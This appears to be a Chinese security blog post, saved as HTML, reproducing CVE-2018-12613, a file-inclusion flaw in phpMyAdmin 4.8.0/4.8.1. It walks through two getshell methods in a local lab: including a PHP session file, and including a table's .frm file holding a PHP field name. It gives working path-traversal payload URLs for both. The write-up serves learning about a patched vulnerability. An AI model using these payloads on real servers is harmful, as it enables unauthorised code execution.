@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>phpMyAdmin4.8.1 后台文件包含 &amp; Getshell | j2ekim&#39;s Blog | 努力改变，从未放弃。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="PHP,Study,getshell,phpMyAdmin">
+    <meta name="description" content="2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。">
+<meta name="keywords" content="PHP,Study,getshell,phpMyAdmin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpMyAdmin4.8.1 后台文件包含 &amp; Getshell">
+<meta property="og:url" content="https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/index.html">
+<meta property="og:site_name" content="j2ekim&#39;s Blog">
+<meta property="og:description" content="2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/select_sql.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/phpsession.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/include_phpsession.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/date.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/find_file_fuck.frm.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/include_file.png">
+<meta property="og:updated_time" content="2018-06-27T16:55:44.092Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpMyAdmin4.8.1 后台文件包含 &amp; Getshell">
+<meta name="twitter:description" content="2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。">
+<meta name="twitter:image" content="https://j2ekim.github.io/img/phpMyAdmin_4.8.1_getshell/select_sql.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="j2ekim&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/Avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">J2ekim</h5>
+          <a href="mailto:j2ekim@gmail.com" title="j2ekim@gmail.com" class="mail">j2ekim@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/j2ekim" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">phpMyAdmin4.8.1 后台文件包含 &amp; Getshell</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">phpMyAdmin4.8.1 后台文件包含 &amp; Getshell</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-06-21T17:28:16.000Z" itemprop="datePublished" class="page-time">
+  2018-06-22
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/">Web安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#描述"><span class="post-toc-number">1.</span> <span class="post-toc-text">描述</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#受影响版本"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">受影响版本</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析与利用"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析与利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#环境部署"><span class="post-toc-number">3.</span> <span class="post-toc-text">环境部署</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP环境-amp-phpMyAdmin"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">PHP环境 &amp; phpMyAdmin</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Getshell"><span class="post-toc-number">4.</span> <span class="post-toc-text">Getshell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#复现思路三"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">复现思路三</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#复现思路四"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">复现思路四</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-phpMyAdmin_4.8.1_getshell"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">phpMyAdmin4.8.1 后台文件包含 & Getshell</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-06-22 01:28:16" datetime="2018-06-21T17:28:16.000Z"  itemprop="datePublished">2018-06-22</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/">Web安全</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。<br><a id="more"></a></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。<br>该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。<br>攻击者必须经过身份验证，但在这些情况下除外：</p>
+<pre><code>$ cfg [&apos;AllowArbitraryServer&apos;] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码
+$ cfg [&apos;ServerDefault&apos;] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码
+</code></pre><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1受到影响。</p>
+<h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h2><p><a href="https://www.colabug.com/3307163.html" target="_blank" rel="noopener">CVE-2018-12613 PhpMyadmin后台文件包含分析</a><br><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog" target="_blank" rel="noopener">phpMyAdmin 4.8.1后台getshell</a></p>
+<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><h3 id="PHP环境-amp-phpMyAdmin"><a href="#PHP环境-amp-phpMyAdmin" class="headerlink" title="PHP环境 &amp; phpMyAdmin"></a>PHP环境 &amp; phpMyAdmin</h3><p><a href="http://phpstudy.php.cn/phpstudy/PhpStudy20180211.zip" target="_blank" rel="noopener">phpMyStudy</a>   （切换 PHP 5.4以上版本才能运行phpMyAdmin 4.8.1）<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">phpMyAdmin 4.8.1</a></p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>结合以上两篇文章，共有4种getshell的方法<br>第一个是上传 sql文件，然后包含mysql的sql文件。<br>第二个是开启 general_log 来完成getshell。<br>第三种是包含 phpsession 文件<br>第四种是创建字段，包含sql文件(类似第一种)。<br>不过第一、二种思路都有些繁琐，最简单的思路是p牛在知识星球中发出的。<br>下文将会复现第三、四种方法。</p>
+<h3 id="复现思路三"><a href="#复现思路三" class="headerlink" title="复现思路三"></a>复现思路三</h3><p>下面复现下第三种思路:</p>
+<p>首先在sql中select ‘要执行的代码’<br><img src="/img/phpMyAdmin_4.8.1_getshell/select_sql.png"></p>
+<p>要包含 session 的文件名可以在 cookie 中的phpmyadmin参数找到。<br><img src="/img/phpMyAdmin_4.8.1_getshell/phpsession.png"></p>
+<p>可以看到，本地文件名前多了个 ‘sess_’,包含之<br><img src="/img/phpMyAdmin_4.8.1_getshell/include_phpsession.png"></p>
+<p>Payload:</p>
+<pre><code>http://localhost/phpmyadminTest/index.php?j2=phpinfo()&amp;target=db_sql.php%253f/../../../tmp/tmp/sess_session值
+</code></pre><h3 id="复现思路四"><a href="#复现思路四" class="headerlink" title="复现思路四"></a>复现思路四</h3><p>创建一个新表，新增一个字段，字段名为 php 语句。<br><img src="/img/phpMyAdmin_4.8.1_getshell/date.png"></p>
+<p>数据库绝对路径：C:\phpStudy\PHPTutorial\MySQL\data\getshell<br><img src="/img/phpMyAdmin_4.8.1_getshell/find_file_fuck.frm.png"><br>可以看到，刚刚的字段名被记录到fuck.frm文件里</p>
+<p>包含之<br><img src="/img/phpMyAdmin_4.8.1_getshell/include_file.png"></p>
+<p>Payload:</p>
+<pre><code>http://127.0.0.1/phpmyadmin/index.php?x=phpinfo();&amp;target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/getshell/fuck.frm
+</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个文件包含漏洞确实挺有意思，学习到不少姿势。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2018-06-27T16:55:44.092Z" itemprop="dateUpdated">2018-06-28 00:55:44</time>
+</span><br>
+
+
+        
+        转载注明来自<a href="/2018/06/22/phpMyAdmin_4.8.1_getshell/" target="_blank" rel="external">https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://j2ekim.github.io">
+            <img src="/img/Avatar.jpg" alt="J2ekim">
+            J2ekim
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Study/">Study</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/getshell/">getshell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/phpMyAdmin/">phpMyAdmin</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/&title=《phpMyAdmin4.8.1 后台文件包含 & Getshell》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/&title=《phpMyAdmin4.8.1 后台文件包含 & Getshell》 — j2ekim's Blog&source=2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《phpMyAdmin4.8.1 后台文件包含 & Getshell》 — j2ekim's Blog&url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/05/03/i'am with you/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">感谢你来到我身边</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>J2ekim &copy; 2017 - 2018</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/&title=《phpMyAdmin4.8.1 后台文件包含 & Getshell》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/&title=《phpMyAdmin4.8.1 后台文件包含 & Getshell》 — j2ekim's Blog&source=2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《phpMyAdmin4.8.1 后台文件包含 & Getshell》 — j2ekim's Blog&url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACPElEQVR42u3aSY7DMAxE0dz/0m6gVwEakquKCjomv1ZGBlvPC0IcXi95Xb9rf/3+yfta3e3vb/b/OrBgwIDxWMa1Xfp23fusNr36zc0LggEDxgCGEmSVEKlvPXt9y89hwIABQw6aLlh/LgwYMGC4AVdPNZWQqifJMGDAmMyoP0x5vF50+2AuDgMGjAcyTjUGPnH9D/0NGDBgfBmjUtx3m5duEmvsCgYMGK0Z+/akWwgrlfWjNsPNTWHAgNGIoZP0BFJJON1QHp5kYcCA0YKhJ5PZsJf7IpRvb/obMGDAaMdwxyayMF35l/EiYMCA0ZSRbbfe5tQPl1I4hgEDRlPGsfJWtCG3kLe8hgEDxhhGZTh1H16zwS/jgAgDBozWDD2x1AOiG3BPHUxhwIDRlZGNkCrjYhnbPRTCgAFjAuNU8pmx68Mfh3NoGDBgfDFDT2XdYlx9fN844cKAAWMAQ29SKumu0oDUB2Gl+8OAAWMMQx90qKSp+ivQQz8MGDAmMPRDm1tu00OtwlveAQYMGE0ZyiPd4pc+POGmvnZdEAYMGI0Y7nEwC9CVGv5NSQ4GDBitGVmZLIt4lQYDDBgwJjMuc7mFNqXloCeuy3vCgAGjNaMynlVJXLONZmEaBgwYPRingqzePMiaAWELEwYMGI0YlZGsrM3pxn6pEwsDBozxjKydmTVN3afDgAEDhl76Vw5zWSPh5uAIAwaMAYzKCIU7BFZpCYSNTBgwYDycUUkg3SJ+NnZmz4/AgAGjD+MHZByyUHchJOwAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
